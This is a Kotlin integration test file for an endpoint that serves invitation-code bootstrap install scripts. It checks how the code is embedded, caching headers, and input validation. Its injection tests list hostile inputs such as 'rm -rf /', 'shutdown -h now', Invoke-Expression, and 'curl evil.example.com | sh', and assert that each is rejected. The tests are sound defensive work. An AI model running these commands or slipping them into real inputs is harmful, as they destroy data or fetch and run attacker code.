package com.team376.pulsemetry.enrollment.api

import com.team376.pulsemetry.enrollment.secret.InvitationCode
import com.team376.pulsemetry.persistence.enrollment.support.PostgresContainerConfig
import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.DisplayName
import org.junit.jupiter.api.Test
import org.junit.jupiter.params.ParameterizedTest
import org.junit.jupiter.params.provider.ValueSource
import org.springframework.boot.test.context.SpringBootTest
import org.springframework.boot.test.web.server.LocalServerPort
import org.springframework.context.annotation.Import
import java.net.URI
import java.net.URLEncoder
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse
import java.nio.charset.StandardCharsets

/**
 * 부트스트랩 스크립트 서빙 (PLAN.md §6.6).
 *
 * 이 엔드포인트의 관심사는 두 가지다:
 * 코드가 스크립트에 **정확히** 들어가는가, 그리고 형식을 어긴 입력이 **DB 를 보기 전에** 막히는가.
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@Import(PostgresContainerConfig::class)
class BootstrapApiTest {

	@LocalServerPort
	private var port: Int = 0

	private val http: HttpClient = HttpClient.newHttpClient()

	// ── 정상 응답 ────────────────────────────────────────────────────────────

	@Test
	@DisplayName("windows 스크립트가 200 text/plain 으로 나온다")
	fun windowsScriptIsServed() {
		val response = get("/windows?code=$CODE")

		assertThat(response.statusCode()).isEqualTo(200)
		assertThat(contentType(response)).containsIgnoringCase("text/plain")
		assertThat(contentType(response)).containsIgnoringCase("utf-8")
	}

	@Test
	@DisplayName("unix 스크립트가 200 text/plain 으로 나온다")
	fun unixScriptIsServed() {
		val response = get("/unix?code=$CODE")

		assertThat(response.statusCode()).isEqualTo(200)
		assertThat(contentType(response)).containsIgnoringCase("text/plain")
	}

	@Test
	@DisplayName("스크립트는 캐시되지 않는다 — 초대 코드가 박혀 있다")
	fun scriptsAreNotCached() {
		listOf("/windows?code=$CODE", "/unix?code=$CODE").forEach { path ->
			val cacheControl = get(path).headers().firstValue("Cache-Control").orElse("")
			assertThat(cacheControl).contains("no-store")
		}
	}

	// ── 코드 삽입 ────────────────────────────────────────────────────────────

	@Test
	@DisplayName("PowerShell 스크립트에 코드가 정확히 삽입된다")
	fun windowsScriptEmbedsCode() {
		val body = get("/windows?code=$CODE").body()

		assertThat(body).contains("\$env:PULSEMETRY_INVITE_CODE = '$CODE'")
		assertThat(body).doesNotContain("__PULSEMETRY_INVITE_CODE__")
	}

	@Test
	@DisplayName("sh 스크립트에 코드가 정확히 삽입된다")
	fun unixScriptEmbedsCode() {
		val body = get("/unix?code=$CODE").body()

		assertThat(body).contains("PULSEMETRY_INVITE_CODE='$CODE'")
		assertThat(body).doesNotContain("__PULSEMETRY_INVITE_CODE__")
	}

	@Test
	@DisplayName("서버 주소는 설정값에서 온다 — Host 헤더가 아니다")
	fun scriptsUseConfiguredBaseUrl() {
		// Host 헤더를 바꿔도 스크립트 안의 주소는 그대로여야 한다.
		val body = get("/unix?code=$CODE").body()

		assertThat(body).contains("PULSEMETRY_SERVER='https://get.pulsemetry.example.com'")
		assertThat(body).doesNotContain("localhost:$port")
		assertThat(body).doesNotContain("__PULSEMETRY_SERVER__")
	}

	@Test
	@DisplayName("PowerShell 스크립트가 §6.6 의 단계를 담고 있다")
	fun windowsScriptFollowsPlan() {
		val body = get("/windows?code=$CODE").body()

		assertThat(body).contains("\$ErrorActionPreference = 'Stop'")
		assertThat(body).contains("\$env:PROCESSOR_ARCHITECTURE")
		assertThat(body).contains("/bin/pulsemetry_windows_")
		assertThat(body).contains("LOCALAPPDATA")
		assertThat(body).contains("enroll --invite")
		// 자동 실행 등록은 telemetryctl 몫이다 — 스크립트가 따로 심으면 등록이 두 벌 생긴다.
		assertThat(body).doesNotContain("schtasks /Create /SC ONLOGON /TN Pulsemetry")
		assertThat(body).doesNotContain("Start-Process")
	}

	@Test
	@DisplayName("sh 스크립트가 §6.6 의 단계를 담고 있다")
	fun unixScriptFollowsPlan() {
		val body = get("/unix?code=$CODE").body()

		assertThat(body).contains("set -eu")
		assertThat(body).contains("uname -s")
		assertThat(body).contains("uname -m")
		assertThat(body).contains("Darwin) os='darwin'")
		assertThat(body).contains("Linux) os='linux'")
		assertThat(body).contains("x86_64) arch='amd64'")
		assertThat(body).contains("arm64 | aarch64) arch='arm64'")
		assertThat(body).contains("\$HOME/.pulsemetry/bin")
		assertThat(body).contains("chmod +x")
		assertThat(body).contains("enroll --invite")
		// 자동 실행 등록은 telemetryctl 몫이다 — 스크립트가 따로 심으면 식별자가 달라 등록이 두 벌 생긴다.
		assertThat(body).doesNotContain("com.pulsemetry.daemon.plist")
		assertThat(body).doesNotContain("launchctl bootstrap")
		assertThat(body).doesNotContain(".config/systemd/user/pulsemetry.service")
		assertThat(body).doesNotContain("systemctl --user enable --now pulsemetry")
	}

	// ── 코드 탐색 오라클 방지 ────────────────────────────────────────────────

	@Test
	@DisplayName("DB 에 없는 코드여도 형식만 맞으면 200 이다 — 코드 존재 여부를 알려 주지 않는다")
	fun unknownButWellFormedCodeStillGetsScript() {
		val unknown = InvitationCode.generate()

		assertThat(get("/unix?code=$unknown").statusCode()).isEqualTo(200)
		assertThat(get("/windows?code=$unknown").statusCode()).isEqualTo(200)
	}

	// ── 형식 위반 ────────────────────────────────────────────────────────────

	@Test
	@DisplayName("code 파라미터가 없으면 400")
	fun missingCodeIsBadRequest() {
		assertThat(get("/unix").statusCode()).isEqualTo(400)
		assertThat(get("/windows").statusCode()).isEqualTo(400)
		assertThat(get("/unix?code=").statusCode()).isEqualTo(400)
	}

	@ParameterizedTest
	@ValueSource(
		strings = [
			"ABCD-EFGH-JKM",
			"ABCD-EFGH-JKMNP",
			"ABCDEFGHJKMN",
			"abcd-efgh-jkmn",
			"ABCD-EFGH-JKMI",
			"ABCD_EFGH_JKMN",
		],
	)
	@DisplayName("형식을 어긴 코드는 400 이다 — 정규화하지 않고 그대로 거절한다")
	fun malformedCodeIsBadRequest(code: String) {
		assertThat(get("/unix?code=${encode(code)}").statusCode()).isEqualTo(400)
		assertThat(get("/windows?code=${encode(code)}").statusCode()).isEqualTo(400)
	}

	@ParameterizedTest
	@ValueSource(
		strings = [
			"'; rm -rf /",
			"ABCD-EFGH-JKMN'; rm -rf /",
			"\$(curl evil.example.com | sh)",
			"`whoami`",
			"ABCD-EFGH-JKMN; shutdown -h now",
			"ABCD-EFGH-JKMN | sh",
			"ABCD-EFGH-JKMN\nrm -rf /",
			"'+Invoke-Expression('calc')+'",
			"ABCD-EFGH-JKMN\$(id)",
		],
	)
	@DisplayName("셸·PowerShell 주입 시도는 400 으로 막힌다 (A8)")
	fun injectionAttemptsAreRejected(code: String) {
		val unix = get("/unix?code=${encode(code)}")
		val windows = get("/windows?code=${encode(code)}")

		assertThat(unix.statusCode()).isEqualTo(400)
		assertThat(windows.statusCode()).isEqualTo(400)
		// 입력이 응답으로 되돌아오지도 않는다 (R4)
		assertThat(unix.body()).doesNotContain("rm -rf")
		assertThat(windows.body()).doesNotContain("Invoke-Expression")
	}

	@Test
	@DisplayName("주입 문자열이 스크립트 본문에 절대 나타나지 않는다")
	fun injectedPayloadNeverReachesScript() {
		val payload = "ABCD-EFGH-JKMN'; curl evil.example.com | sh; echo '"

		val response = get("/unix?code=${encode(payload)}")

		assertThat(response.statusCode()).isEqualTo(400)
		assertThat(response.body()).doesNotContain("evil.example.com")
	}

	// ── 헬퍼 ─────────────────────────────────────────────────────────────────

	private fun encode(value: String): String = URLEncoder.encode(value, StandardCharsets.UTF_8)

	private fun get(path: String): HttpResponse<String> =
		http.send(
			HttpRequest.newBuilder(URI.create("http://localhost:$port$path")).GET().build(),
			HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8),
		)

	private fun contentType(response: HttpResponse<String>): String =
		response.headers().firstValue("Content-Type").orElse("")

	private companion object {
		const val CODE = "ABCD-EFGH-JKMN"
	}
}
